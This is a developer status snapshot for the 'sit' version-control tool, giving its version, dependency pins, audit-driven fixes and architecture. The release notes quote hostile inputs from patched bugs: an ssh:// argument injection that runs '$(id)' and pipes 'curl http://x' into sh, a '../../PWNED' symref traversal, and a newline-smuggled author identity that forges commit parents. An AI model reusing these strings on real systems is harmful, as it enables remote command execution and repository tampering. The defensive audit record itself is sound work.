# sit — Live State Snapshot

> Volatile state for this project. Refreshed every release. Do not inline this content into `CLAUDE.md` or `README.md` — they're durable rules only.
>
> Historical release narrative lives in [`CHANGELOG.md`](../../CHANGELOG.md). This file is a point-in-time snapshot.

## Current

- **Version**: 1.4.1 (read `VERSION` for the authoritative number)
- **Cyrius toolchain**: 6.5.26 (pinned in `cyrius.cyml [package].cyrius`; 6.5.4 → 6.5.24 in v1.3.6, → 6.5.26 in v1.4.0 — latest published, and the manifest-vs-wrapper drift warning is clear). **As of 1.3.6 this pin is the single lever for every dependency sit has** — `sakshi` / `sankoch` / `sigil` / `patra` are all folded into the stdlib snapshot and are now `[deps].stdlib` leaves, not git deps, so there are **zero `[deps.<name>]` blocks and zero commit-pinned lock entries**. The versions 6.5.26 folds — all four verified byte-identical to the resolved `lib/` — are sakshi `2.4.10` (6.5.16), sankoch `2.7.7` (6.5.17), patra `1.13.0` (6.5.20), sigil `3.12.9` (6.5.22). ⚠ **sankoch `2.7.8` exists but is not folded yet**: it was cut 2026-08-18 (toolchain catch-up to 6.5.26, zero source change, ten byte-identical bundles) and the pin can only select what the snapshot ships. Nothing in it affects sit; it arrives on the next fold, and there is nothing to wait for. Carried from earlier lines: syscall-arity mismatches are a **hard error** (6.5.4 — caught the `sys_waitpid` AGNOS bug fixed in 1.3.5), `lib/thread.cyr` no longer defines `mutex_*` so `sync` is the sole owner (6.5.4), the AGNOS syscall peer `lib/syscalls_x86_64_agnos.cyr` (6.4.2), and the `distlib` per-module read cap 256 KB → 1 MB (6.4.10). Two 6.5.x fixes were checked and found **off sit's path**: 6.5.20's `switch` / `match` case-body miscompile (sit has no `switch` statement) and sigil 3.12.3–3.12.6's banked-RSA forged-signature bypass (sit is ed25519-only). Vendored-stdlib build noise is now seven `assigning non-pointer to typed pointer` warnings from `lib/bayan.cyr`'s TOML parser (new in 6.5.24, which fixed the warning's sign test) plus the four long-standing `async_*` undefined-function notes — all in DCE-stripped code, none in sit source.
- **Binary**: **2.84 MB** (2,977,624 bytes) statically-linked, **no dynamic dependencies** (`ldd` → *not a dynamic executable*; DCE). Down from 14.84 MB at 1.3.5 — sigil 3.12.9 localised the banked RSA and bignum workspaces and removed 9.53 MiB of `.bss`. Inherited, not earned: sit references none of that surface.
- **Status**: **1.4.1 — every object lookup was a full table scan.** Wiring the two long-available dependency capabilities turned up something worse than the missing calls: **`objects.hash` had no index**, so patra could not take its indexed-WHERE path and every `read_object` / `db_object_has` / `resolve_hash` scanned the whole table — making `log` / `status` / `diff` / `clone` quadratic in repository size. Proven by holding the work fixed and varying only the table: 50 commit reads took 14–15 ms at ~300 objects and 44–45 ms at ~1200. Now indexed on both the local store and the **remote** handle `clone` reads through, migrated once via a `.sit/objects.indexed` marker (fresh repos build an empty tree free; older repos pay one rebuild). **`clone` 167.32 → 122.65 ms (−27%), ratio to git 12.13× → 8.64×** — it was the worst row in the head-to-head and is no longer; `log` −13%; single `cat-file` on 1200 objects −37%. ⚠ **The curve is not flat yet** (13 → 35 ms across a 4× table), so patra's indexed path retains some growth — that is upstream and is `1.4.2` on the roadmap; this release removed the sit-side cause, not the whole curve. The index is also the **precondition** for `patra_insert_row_or_ignore` (P-11, now wired — one B+ tree op per object instead of two): patra's or-ignore needs `SCH_IDX_ROOT` and silently always-inserts without it, so wiring it alone would have generated duplicate rows. All 15 `zlib_decompress` sites now use `zlib_decompress_with_ratio_cap` at 1000:1 (P-12) — a deliberately narrow backstop, since zlib maxes near 1032:1 and the 16 MiB ceiling stays load-bearing; it closes the tiny-input-to-full-ceiling bomb shape and is not tighter because 1 MiB of identical bytes legitimately compresses near 1000:1. 282 unit / 88 integration / 9 fuzz / lint 0 / audit green. Prior: **1.4.0 — `fsck` reports missing objects; commit identities can't forge headers.** Two integrity fixes that are the same bug from both ends. **(1) `fsck` never reported a MISSING object**: it enumerated only what is IN the store (flagging unreadable ones), so an object simply ABSENT — a commit whose `parent`/`tree` names an oid the store lacks — was never enumerated and the walk silently skipped it. The canonical broken-repo shape reported **`0 bad, 0 dangling`, exit 0**. Now recorded during the walk and split: in-store => already `unreadable` (not double-counted); absent => **`missing <oid>`**, counted toward `bad`, which also makes the `--prune` tripwire cover it. ⚠ **Shallow clones exempt** — a `--depth N` boundary commit's parents are absent by design, and the existing `--depth 1` scenario failed the first cut of this change immediately; `.sit/shallow` is now consulted, as git does with `.git/shallow`. **(2) A newline in a commit identity forged a header line**: the builders memcpy'd author/committer name+email straight into the object body, so `SIT_AUTHOR_NAME=$'evil\nparent <64-hex>'` produced a commit carrying a **fabricated `parent`** (two — author and committer) that every parent walk believes — and since that parent doesn't exist, fsck called it clean. New `ident_sanitized()` drops control bytes and `<`/`>` before framing, git-style. ⚠ Scope narrower than it looks: the `.sit/config` route was already closed (line-based parser), leaving the `SIT_AUTHOR_*` env vars — self-inflicted; fixed anyway because a forged parent is corruption regardless of cause. **Minor, not patch**: `fsck` gains a `missing` line and now **exits non-zero on a repo it previously called clean**. The themed minor line shifts +1 (tags → 1.5.0). 282 unit / **88 integration** (was 83) / 9 fuzz / lint 0 / audit green; the three new assertions fail against a pre-fix binary with the exact symptoms. Prior: **1.3.9 — the deferred findings, closed.** Clears the entire deferred queue from the 2026-08-18 deep audit: 1.3.8 shipped every CRITICAL and HIGH and named ten MEDIUM/LOW it deliberately left; this fixes all of them plus three sub-items. **The audit backlog is now empty.** Headline is functional, not security: **sit refused to diff any file over 8192 lines added or deleted** — `lcs_diff`'s S-07 overflow guard capped each DIMENSION at 8192 before computing cells, but a pure addition has `n1 == 0` so the table is 1x(n+1) (~64 KB, trivially fine); the cap still forced the Myers fallback, whose 4096 edit-distance limit cannot represent an 8193-line insertion, so sit printed a header and ZERO content lines. Verified at the boundary (8192 fine, 8193 nothing). Replaced with an overflow-safe product test by division. Also: `-U0` now emits a true zero-context patch (matches GNU `diff -U0`; the hunk-close path skipped the ctx trim); `-U<N>` clamped (at 2^62 the `2 * ctx` compare overflowed negative and the trim loop spun ~4.6e18 times); **`fsck --prune-now` could delete objects a live tree still references** (parse_tree silently drops non-allowlisted-mode entries so the walk never enqueues them — `bad` stays 0, they report `dangling`, prune deletes them; pushable remotely since `_serve_rehash_and_insert` never parses tree bodies — now counted and prune refuses); unvalidated ids reaching the **remote-handle** SQL path (1.3.8 gated only the local `read_object`) and the same gap in `ssh_remote_read_raw`; **remote-driven unbounded client allocation** in the reachability walk, now capped with the failure PROPAGATED at all four call sites (a partial object set plus a moved ref is worse than the DoS); `sit_repo_open` probing the wrong directory (backend detected before the repo root was set — invisible on Linux where consumers pass ".", exactly the AGNOS case) and `git_pack`'s raw cwd-relative `is_dir` bypassing the same seam; config values echoed unsanitized; `read_merge_head` unvalidated; a silently-dropped auto-merge write on the conflict path. **Closed by 1.3.8 with no new code** (verified, recorded not re-fixed): `sit_repo_branch` control/ANSI bytes — it flows through the `refname_valid` gate added there. 282 unit / **83 integration** (was 78) / 9 fuzz / lint 0 / audit green; the three user-visible diff regressions fail against a pre-fix binary with the exact reported symptoms. Report: [`docs/audit/2026-08-18-audit.md`](../audit/2026-08-18-audit.md) § Deferred. Prior: **1.3.8 — deep audit: `sit merge` crashed on an ordinary merge, plus 14 more fixes.** A second, much wider pass run straight after 1.3.7: **10 independent auditors** across every module, **every** finding through three adversarial verifiers (majority-refute kill rule), then a completeness critic. 36 candidates, 29 survived, ~26 unique. **The worst defect is not a security bug**: `sit merge` SIGSEGV'd when one side appended a line and the other prepended one — an everyday merge, no hostile input — and on surviving paths silently dropped one side's edits. `three_way_line_merge` took a hunk's `base_end` unconditionally, but an insert-only hunk has `base_start == base_end`, so the cursor was assigned to itself and the same hunk re-appended forever past the allocation (`append_line_to_buf` had no capacity argument). Fixed both ways; the merge now yields the correct `Z0 a b X1`, matching git. Security fixes: **ssh:// argument/remote-command injection** (the header comment promised `url_authority_path_valid` whitelisting and never called it — pre-fix argv carried `[user@evil$(id)]` and `[/repo;curl http://x|sh]` into the remote login shell); **HEAD symref path traversal** (`ref: ../../PWNED` made `sit commit` write outside the repo — now `refname_valid`-gated at the choke point); **`serve --stdio` body-completeness bypass** (dispatched on the claimed Content-Length, making every handler's check the tautology `X > X`); **remote Content-Length i64 overflow** on the http+ssh clients; **`_wildmatch` catastrophic backtracking** (an 18-byte ignore file pinned a core — 15s → 4ms via a step budget; ⚠ bounds the resource, not the complexity class); **`config_file_set` heap overflow** (2,010,007 bytes into a 9,016-byte allocation, exit 0); **four unbounded walks** (commit-timestamp spin, cyclic parent chain, `flatten_tree` node count, worktree symlink descent); **unvalidated object ids into a SQL literal** (gated in `read_object`, covering a dozen callers); **`.git/config` hash-algo unanchored substring scan** (any `sha256` anywhere — including an attacker-chosen submodule name — silently made `sit_repo_status` report a clean tree as all-untracked to owl/thoth). 282 unit / **78 integration** (was 70) / 9 fuzz / lint 0 / audit green; new regressions proven non-vacuous against a 1.3.7 binary (SIGSEGV 139, timeout 124, outside-write, symlink descent). **10 confirmed MEDIUM/LOW findings deliberately deferred to 1.3.9** — named in the report and on the roadmap; none is memory-safety. Both dist profiles regenerated: the fixes reach `[lib]` and `[lib.read]`, so **owl / thoth inherit them and should be rebuilt**. Report: [`docs/audit/2026-08-18-audit.md`](../audit/2026-08-18-audit.md). Prior: **1.3.7 — hardening pass: two memory-safety defects in the git packfile reader.** A full P(-1) audit / refactor / hardening pass. **The `.git/` packfile reader (`src/git_pack.cyr`, v1.2.0) was the one module in the tree with no fuzz target, and it is where every serious finding landed** — the coverage gap and the defect cluster were the same place. Both are reachable from a **read-only** command against a repo the user merely opened, which matters because `.git/` read-mode exists so owl / thoth can report on arbitrary real-world repos, routinely cloned from remotes the user does not control. **(1) HIGH — `_git_idx_lookup` trusted the `.idx` table geometry**: it validated magic + version + `len >= 1032`, then computed every table address from numbers *inside the file* (object count `N`, fanout-derived search bounds, both offset tables). A fanout claiming ~10⁹ entries drove `_memcmp_n` gigabytes past the mapping — **reproduced as SIGSEGV three distinct ways** on plain `sit cat-file <hash>`. Now bounds `N` by real file length, requires a monotonic fanout in `[0, N]`, and separately bounds the large-offset table (which sits after the size gate). **(2) HIGH — `_git_apply_delta` read past the delta buffer**: the literal opcode bounds-checked its destination but never its source, so a delta ending in a bare `0x7F` copied **127 bytes of adjacent heap** into the object — and since the attacker also picks `result_size`, it **returned success** and sit printed them. Observed output carried a **live heap pointer**, an ASLR-defeating disclosure via `cat-file`. Now bounds the literal and the COPY operand run against `delta_len`. Six further missing guards on the same parser closed as hardening (unbounded varint decoders, unvalidated pack `offset`, negative-length inflate, zero-distance OFS_DELTA self-reference, REF_DELTA oid past pack end) — recorded as defense-in-depth, **not** demonstrated exploits, since their corpus cases pass pre-fix too. Plus LOW: a `refs/remotes/` guard off-by-one in `serve.cyr` (in-bounds, correct behaviour, misleading — the only instance found by a mechanical guard-vs-compare scan). **New coverage**: an 11-case hostile packfile corpus (`tests/integration/hostile_pack.py`) opening with a **positive control** — load-bearing, since the corpus's first draft scored 7 false passes from fixtures that never reached the parser — proven non-vacuous by A/B (4 cases fail pre-fix: 3× `exit=-11`, 1× `LEAK 127B`); plus two fuzz harnesses (`fuzz_pack_varints`, `fuzz_apply_delta`). ⚠ Without ASAN fuzzing catches crashes but not the overread; the disclosure is pinned by the deterministic corpus. Also: `_serve_rehash_and_insert`'s double framing-header scan consolidated to one pass; `src/lib/` (3.4 MB of stale pre-6.x artifacts) and an empty `src/build/` removed; `run.sh` no longer shadows its own `$ROOT` with a commit hash. 282 unit / **70 integration** (was 58) / **9 fuzz harnesses** (was 7) / lint 0 warnings / audit / bench green; no benchmark regression (max |delta| 7.0% on a sub-µs measurement); `--agnos` clean with and without DCE. Both dist profiles byte-identical to 1.3.6 apart from the version stamp — owl / thoth unaffected. Report: [`docs/audit/2026-08-17-audit.md`](../audit/2026-08-17-audit.md). Prior: **1.3.6 — cyrius `6.5.24` + deps to latest, and the four first-party layers stop being git deps.** A refresh whose substance is a **packaging correction**. Through 1.3.5 sit declared sakshi / sankoch / sigil / patra as `[deps.<name>]` git blocks, which was wrong in two ways for a project that publishes a bundle: (1) a git pin **overrides** the stdlib fold — `cyrius deps` overlays it on top of the snapshot on every build, recursing through sibling manifests, so a stale pin pushes the older file onto anything reaching sit transitively; the only signal is an unnamed `N bundled lib(s) differ` warning, and `deps --verify` can't catch it because the lock is written *from disk* and records the downgraded file's hash. (2) On a bundle-publishing project a git dep makes `cyrius distlib` **reclassify the module out of the stdlib leaves**, dropping it from the sidecar — measured at 1.3.5's shape, `dist/sit.cyr` referenced **27 symbols** across sigil / sankoch / patra while `dist/sit.deps` listed only the 34 stdlib leaves and none of the three modules defining them, so a consumer building from bundle + sidecar couldn't resolve them. Both closed by moving all four into `[deps].stdlib`; the sidecar now declares 38 leaves and the lock has no commit pins. patra (1.13.0) and sigil (3.12.7) both made this same change upstream for the same reason; kavach hit the reclassification. Each bump was verified against its **actual bundle diff**, not its changelog: patra 1.12.12→1.13.0 is three hunks (version stamp + indented `#ifdef`s in `_wal_gen_salts` + one continuation-line indent) with **zero logic change**, so no storage-format risk; sankoch 2.7.6→2.7.7 is purely additive in the ZIP layer (11 new `zip_*` fns) and **does not touch deflate/inflate/zlib/LZ77/Huffman**, sit's whole consumed data path; sigil 3.12.8's breaking `err_*` → `sigil_err_*` rename touches no symbol sit references, and all 10 consumed sigil symbols are unchanged. 282 unit / 58 integration / fuzz (7 harnesses) / lint (0 warnings) / audit / bench green; `--agnos` clean with and without DCE. Both dist profiles regenerated at 1.3.6, **byte-identical to 1.3.5 apart from the version stamp**, so owl / thoth are unaffected. **No behaviour change.** Prior: **1.3.5 — sankoch `2.7.6` (>1 MiB object corruption) + cyrius `6.5.4` + AGNOS ssh-reap ABI.** Nominally a toolchain/dep refresh, but the sankoch bump carries a **silent data-corruption fix affecting every release ≤ 1.3.4** (compressible objects only — see the dependency section for the data-dependency caveat): sankoch's batch DEFLATE chunker resumed each 1 MiB block at `block_end` while the encoder had overshot by up to 258 bytes (`LZ77_MAX_MATCH`), double-encoding the overshoot so the stream would not decode. sit compresses every object through that path (`zlib_compress`, `src/object_db.cyr:176`), so **compressible objects over ~1 MiB were corrupted on write**. Verified by direct A/B repro against both pins (2.5 MiB: fails at 2.4.9, roundtrips at 2.7.6; 512 KiB and exactly-1 MiB pass on both — the trigger is strictly `> DEFLATE_BLOCK_SIZE`). Corruption happened at write time, so **upgrading does not repair existing repos** — `sit fsck` surfaces them as `unreadable <hex>`, and `fsck --prune` refuses to run while `bad > 0`. Pinned by the new `test_sankoch_zlib_large_object` regression test (512 KiB / 1 MiB / 2.5 MiB), confirmed to fail at 2.4.9 and pass at 2.7.6. Separately, cyrius `6.5.4` promoted syscall-arity mismatches from warning to **hard error**, catching the last Linux-shaped syscall in the ssh transport: `wire_ssh_close`'s `sys_waitpid(pid, &status_buf, 0)` against agnos' 1-arg `sys_waitpid(pid)`. Dead code on agnos (`wire_ssh_open` early-returns there) but the arity check is static, so it's now gated `#ifndef CYRIUS_TARGET_AGNOS` — completing the AGNOS sweep started in 1.3.3 (ssh spawn) and 1.3.4 (FS syscalls). `[deps].stdlib` gains `thread_local` (sigil ≥ 3.12.1 + patra 1.12.12 both call it; undeclared modules of that class fail at runtime, per the v1.0.2 `random`/SIGILL precedent). 282 unit (was 273; +9 from the new boundary test) / 58 integration / fuzz / audit green; `--agnos` builds clean with and without DCE. Both dist profiles regenerated at 1.3.5 — **byte-identical to 1.3.4 apart from the version stamp**, so owl / thoth are unaffected. **Linux/macOS behaviour otherwise unchanged.** Prior: **1.3.4 — AGNOS FS-syscall ABI + cyrius `6.4.25` + dep refresh.** sit's low-level path syscalls (`open`/`stat`/`mkdir`/`unlink`/`rmdir`/`newfstatat`) were Linux-shaped and silently miscompiled off Linux (`--agnos` builds; wrong at runtime under mirshi). Routed every site through the stdlib length-carrying wrappers (`file_open` / `xstat` / `xunlink`) + two local `sit_mkdir` / `sit_rmdir` bridges + an `#ifdef CYRIUS_TARGET_AGNOS` lstat-degradation branch in `validate.cyr` / `serve.cyr` (agnos has no lstat). Toolchain `6.4.21 → 6.4.25` + all git-crate deps to latest — **patra `1.12.7 → 1.12.9`** unblocks the AGNOS object-write open path (its `.patra` opens now route through `file_open`). `init` / `add` / `status` run under mirshi on the AGNOS binary; 273 unit/integration pass; both dist profiles regenerated at 1.3.4. **Linux/macOS byte-identical.** Prior: **1.3.3 — AGNOS SSH-transport gating + cyrius `6.4.21`.** The wire layer's last Linux-ism — the SSH `ssh`-binary spawn path (`fork`/`exec`/`access`) in `src/wire_ssh.cyr` — is gated out of the `--agnos` build (`#ifndef CYRIUS_TARGET_AGNOS` around the `SYS_ACCESS` probe; `#ifdef CYRIUS_TARGET_AGNOS` early-return + `#else`-wrapped spawn body). AGNOS has no fork/exec/access and `sit` there never shells out to `ssh`; ssh:// clone fails cleanly. **Linux behavior byte-identical.** `cyrius build --agnos` → OK; the AGNOS binary runs under mirshi (`init`/`status` clean). 273 unit/integration pass; both dist profiles re-synced to 1.3.3 (`dist/sit-read.cyr` had drifted to 1.3.1). Unblocks `sit` in the agnos-dev docker image. Prior: **1.3.1 — chdir-free `sit_repo_open` (AGNOS-native read API).** The library
  `sit_repo_open` no longer `chdir`s — it reads the repo at the process cwd. Behavior-preserving (all
  consumers pass `"."`: owl, thoth, git_probe) and it removes the `SYS_CHDIR` reference that hard-failed
  a `dist/sit-read.cyr` consumer's `--agnos` build (AGNOS floor has no chdir). `cwd` arg is now advisory.
  273 unit / 58 integration unchanged; both dist profiles + serve banner at 1.3.1. Prior: **1.3.0 —
  read-only dist profile.** A new `cyrius distlib read` profile (`[lib.read]` in `cyrius.cyml`) emits **`dist/sit-read.cyr`** (8.6k lines vs the full 13.5k) — the same public `sit_repo_*` API from only the read path, dropping `sign` + the network stack (`wire`/`wire_http`/`serve`). It references none of the dead-code stdlib globals (`HSV_REQ_BUF_SIZE`/`TLS_OK`) or `wire_ssh` symbols the full bundle carries, so a read-only consumer (thoth's status bar, owl's gutter markers) compiles it with **no shims and no wire warnings** — the artifact thoth's 0.13.0 git producer consumes. Packaging cut: no behavior/API change (only the mandatory `serve_build_capabilities()` version-stamp bump 1.2.0→1.3.0), 273 unit / 58 integration unchanged, both dist bundles regenerated at v1.3.0. Prior line: **1.2.0 — `.git/` read-mode.** Reads an existing git repo (SHA-1 default + SHA-256) **read-only** — loose objects + **packfiles** (`.idx` v2 lookup + a first-party OFS/REF **delta interpreter**, recursive chains) + refs (`.git/HEAD` symref/detached, `refs/`, `packed-refs`) — behind the *same* public API as `.sit/` repos, via a storage seam (`sit_repo_open` sets a backend; `read_object` / `read_head_ref` / `resolve_ref_name` dispatch; object-id width centralised in `_id_hexlen` / `_id_rawlen`). New public accessors **`sit_repo_branch`** + **`sit_repo_status`** (HEAD-vs-worktree; honours `.gitignore`) with `sit_status_path` / `sit_status_kind`; existing `sit_diff_path` now works on git repos (owl/thoth need no consumer-side branching); CLI `cat-file` / `owl-file` are git-aware. New modules **`src/git_read.cyr`** + **`src/git_pack.cyr`** (in `[lib].modules`, before `object_db.cyr`). Read-only (no `.git/` write-back — sit stays `.sit/`-native); SHA-1 never *computed* (objects looked up by id → no first-party SHA-1 needed; SHA-256 trust boundary intact). [ADR 0011](../adr/0011-git-read-mode.md), scoping [ADR 0004](../adr/0004-sha256-only.md). Folds in the **cyrius `6.2.44 → 6.3.36`** toolchain + dep refresh (sakshi `2.4.3`, sankoch `2.4.8`, sigil `3.9.9`, patra `1.12.7`; stdlib `+sync`). 273 unit / 58 integration (loose + packed depth-5 deltas + refs + `packed-refs` + SHA-256 + a `dist/sit.cyr`-linked library-API probe) / fuzz / lint green; validated byte-for-byte against real `git` repos. `dist/sit.cyr` regenerated (carries `git_read` + `git_pack`). Benign DCE-stripped warnings: `async_*` + mutex-dup (`sync`/`thread`) from vendored stdlib. **Still ready to consume (pins current, wiring pending)**: patra `patra_insert_row_or_ignore` (P-11) and sankoch `zlib_decompress_with_ratio_cap`. **Next: 1.4.0** — annotated & signed tags + ref ergonomics (see [roadmap](roadmap.md); resequenced from 1.3.0, which shipped the read-only dist profile); deferred git-read follow-ups: CLI `status` / `log` / `diff` on git, `@{N}` on git.
- **Primary target**: Linux x86_64. aarch64 cross-build best-effort under cyrius 6.5.26 — still failing, now at `src/wire_ssh.cyr:204`'s `SYS_ACCESS` (aarch64 has no `access`, only `faccessat`; the site's `#ifndef CYRIUS_TARGET_AGNOS` gate covers AGNOS but not aarch64). Same class as the long-tracked `SYS_OPEN` blocker (that issue file was archived and its standalone note removed); `release.yml` catches the failure and ships x86_64 only. **AGNOS (`--agnos`) builds clean**, DCE included

### Architecture call-outs (carried across v0.6.x + v0.7.x)

- **Patra handle caching**: `get_object_db()` (object_db.cyr) and `get_index_db()` (index.cyr) memoize per-process. `object_db_open()` / `index_db_open()` still exported for the wire-protocol callers that need an explicit fresh handle for the remote-side DB (every fetch/push targets a different file)
- **Wire transactions**: `copy_objects` (src/wire.cyr) wraps the insert loop in `patra_begin` / `patra_commit` since v0.6.5. `db_object_insert_raw` returns `1` for already-existed and `0` for actually-inserted (caller increments `copied` only on `== 0`)
- **Walk-reachable cache**: `walk_reachable_*` (src/wire.cyr) populates a `raw_cache` map of compressed bytes since v0.6.7; `copy_objects` reads from cache to skip the second source-DB read for commits + trees. **v0.7.3:** the cache is transport-independent (compressed bytes are bytes), so HTTP fetches benefit identically to local fetches
- **`obj_src` abstraction (v0.7.3)**: 16-byte tagged handle `{kind, payload}` wraps either a patra DB pointer (`OBJ_SRC_DB` = 0) or a `wire_http` handle (`OBJ_SRC_HTTP` = 1). `walk_reachable_tree` / `walk_reachable_from_commit` / `copy_objects` all take `obj_src` instead of a raw `src_db`; `obj_src_read_raw` / `obj_src_read_both` dispatch to either `db_object_*` (wire.cyr) or `http_remote_*` (wire_http.cyr). Lifetime: caller still owns the underlying handle and closes it explicitly (`patra_close` for DB, `wire_http_close` for HTTP)
- **`wire_transport_check` split (v0.7.3)**: `_readable` (file + http allowed) and `_writable` (still rejects http with `"push over http requires sit 0.7.5+"`); `cmd_clone` and `do_fetch` use `_readable`, `cmd_push` uses `_writable`. https + ssh stay gated everywhere with their original v0.7.6 / v0.7.8 pointers
- **HTTP body cap**: `WIRE_HTTP_MAX_BODY` = 16 MiB on both ends (server `SIT_SERVE_MAX_BODY`; client recv buffer growth). Matches `db_object_read_both`'s decompression ceiling so the failure modes line up regardless of transport
- **`POST /sit/v1/want`**: server endpoint live + advertised in capabilities (`"batch":true,"batch_max":512`); v0.7.5 wires the client side end-to-end via `walk_reachable_phased` (commit chain → tree-batch → blob-batch) + `obj_src_batch_prefetch` in `copy_objects`. Frame format at [ADR 0006](../adr/0006-batched-want-frame-format.md). Binding constraint on `SIT_WANT_MAX_COUNT = 512` is sandhi's `HSV_REQ_BUF_SIZE = 64 KiB` request buffer; client chunk size is 256 (`WIRE_HTTP_BATCH_CHUNK`). 10M-iteration fuzz harness (`fuzz_want_frame_decoder`) drives `_wire_http_decode_frames` against pseudo-random bytes — extracted from `http_remote_read_batch` specifically so the fuzz target doesn't need a TCP socket
- **Phased walker (v0.7.5)**: `walk_reachable_phased` + `walk_reachable_tree_batched` replace the sequential `walk_reachable_from_commit` + `walk_reachable_tree`. Phase 1 walks the commit chain sequentially (parent-of-parent has no parallelism). Phase 2 batch-prefetches every collected tree hex via `POST /sit/v1/want`. Phase 3 walks each tree from `raw_cache` — cache-aware via the new `_decompress_raw_into` helper that decompresses cached compressed bytes without re-fetching from the transport. Per-level sub-tree batching for nested directories. `obj_src_batch_prefetch` is no-op for OBJ_SRC_DB so file:// path is identical to v0.7.4 (`165 ms` median, no regression)
- **HTTP push + bearer auth (v0.7.6)**: `cmd_push` branches on URL scheme — `URL_SCHEME_HTTP` runs `_do_push_http` (capabilities probe, optional bearer-token load, FF preflight, walk reachable, POST each object via `http_remote_push_object`, POST ref via `http_remote_push_ref`, "everything up-to-date" short-circuit). Trust boundary: `_serve_rehash_and_insert` runs sigil's `hash_data` over every uploaded object's full `<type> <len>\0<content>` frame and refuses on hex mismatch. Bearer auth: `_serve_load_token` enforces 0600 perms + ≥16 chars + no control bytes; `_serve_auth_ok` does constant-time compare across `max(presented_len, token_len)` so timing doesn't leak prefix matches. Capabilities advertise `"auth":["bearer"]` when `--require-auth`, `"auth":["none"]` otherwise; `"push":true` always. Read endpoints (capabilities/refs/objects/want) stay anonymous in both modes
- **No-FFI thesis** (ADR 0001 + ADR 0007): no libssl, no libcrypto, no fdlopen-bridged dlopen. HTTPS via libssl will not ship; first-party Cyrius TLS is the only path that unlocks `https://` later. SSH (v0.7.8 — bumped from v0.7.7 when owl's library-export request slotted in front of it) is the canonical encrypted-over-internet transport (sit consumes the SSH binary as a process boundary, not an FFI dep — same separation as git's ssh:// support). HTTP is loopback / private-network / behind-tunnel; bearer auth is local-process-snoop defence, not a TLS substitute
- **Buffered stdout**: 206 sites in src/*.cyr route through `stdout_write(data, len)` in src/util.cyr since v0.6.8; flushed in main.cyr trailer before `SYS_EXIT`. STDERR (`eprintln`) stays direct
- **exec_vec envp**: empty (cyrius stdlib `lib/process.cyr` passes a NULL-only envp; no env-var inheritance in `cmd_owl_file`). Any future curated-envp shape would be a deliberate widening
- **patra BATCH mode (NOT enabled)**: investigated in v0.6.10 and reverted — durability regression with no perf gain on sit's bench shape (cached handle never closes, so pending writes would sit in the kernel writeback window). Reasoning at the `get_object_db` / `get_index_db` call sites; revisit when sit grows explicit `patra_flush()` at command exit

## Source layout

22 files total, ~15,950 lines. **The 1.3.6 → 1.4.0 arc added ~1,150 lines and almost all of it is bounds checks, guards and their rationale** — two security audits plus the 1.4.0 integrity work. The largest movers: `object_db.cyr` +331 (fsck `missing` detection, the shared shallow-set loader, the `read_object` id gate), `refs.cyr` +165 (symref validation at the choke point, the `-d` refname gates, the checkout hex gate), `util.cyr` +231 (`content_length_sane`, `ident_sanitized`, and the sf_* rationale), `git_pack.cyr` +142 (the S-24 pack/idx bounds), `tree.cyr` +59 (node budget + dropped-entry counter). **v1.3.7** grew `src/git_pack.cyr` 377 → 515 lines — all bounds-checking from the 2026-08-17 audit (see below); nothing else in the tree moved materially. It also **removes `src/lib/`** (3.4 MB of stale, gitignored, unreferenced pre-6.x build artifacts, still carrying `base64.cyr` / `bigint.cyr` that cyrius 6.x folded into `bayan`) and an empty `src/build/`, so `src/` is now exactly the 22 source files and nothing else. **v1.2.0** adds `src/git_read.cyr` (313 lines: `.git/` backend — loose-object read, refs + `packed-refs`, backend detection, width helpers) + `src/git_pack.cyr` (377 lines: `.idx` v2 lookup + pack v2 decode + delta interpreter). **v1.1.0** added `src/reflog.cyr` (456 lines). v0.8.12 adds ~334 lines to `src/commit.cyr` (the `print_graph` ASCII-DAG renderer) + ~85 to `src/wire.cyr` (shallow-clone depth cap + `.sit/shallow`). v0.8.10 added ~220 to `src/index.cyr` (the `_wildmatch` gitignore matcher). v0.8.9 added ~190 to `src/wire_http.cyr` (keep-alive client); v0.8.8 added `src/wire_https.cyr` + ~280 to `src/serve.cyr`. v0.8.7 was a small net add; v0.8.6 source-flat.

| File | Lines | Responsibility |
|------|------:|----------------|
| `src/lib.cyr` | 22 | include chain (domain modules; stdlib auto-includes via `cyrius.cyml`) |
| `src/main.cyr` | 117 | `print_usage`, `main()`, dispatch (26 cmds; `merge-base` added v0.8.13), trailer (with `stdout_flush()` since v0.6.8) |
| `src/api.cyr` | 209 | **Public surface** ([ADR 0009](../adr/0009-public-api-contract.md)): `sit_repo_open` / `sit_repo_close` / `sit_diff_path`; **v1.2.0** adds `sit_repo_branch` + `sit_repo_status` (+ `sit_status_path` / `sit_status_kind`) — all backend-aware (`.sit/` or `.git/`). Thin wrappers over the storage-seam readers; consumers owl + thoth |
| `src/util.cyr` | 469 | `eprintln`, `ensure_dir`, `ensure_parent_dirs`, `alloc_or_die` (S-17, v0.6.2), `stdout_write`/`stdout_flush` (P-17, v0.6.8), `write_decimal`, `argv_heap`, `skip_ws`, `strcmp_cstr`, `sort_cstrings`, `read_file_heap`, `write_sanitized` (S-21) |
| `src/sign.cyr` | 331 | ed25519 signing + `cmd_key/verify-commit` (O_EXCL in 0.6.0; sitsig hex validation in v0.6.2) |
| `src/config.cyr` | 392 | `config_*` helpers + `cmd_config` |
| `src/tree.cyr` | 426 | `parse_tree`, `build_tree`, `flatten_tree` (depth-capped); hashmap-backed `tree_find` + `three_way_path_set` (P-10/P-18 since v0.6.6) |
| `src/validate.cyr` | 527 | Pure validators: `hex_prefix_valid`, `refname_valid`, `tree_entry_name_valid`, `tree_flat_path_valid`, `tree_entry_mode_valid`, `config_value_valid`, `config_key_valid`, `remote_url_valid` (HTTP/HTTPS/SSH whitelist body since v0.7.1), `url_scheme` (v0.7.1), `url_authority_path_valid` (v0.7.1), `path_is_symlink`, `path_lstat_kind` |
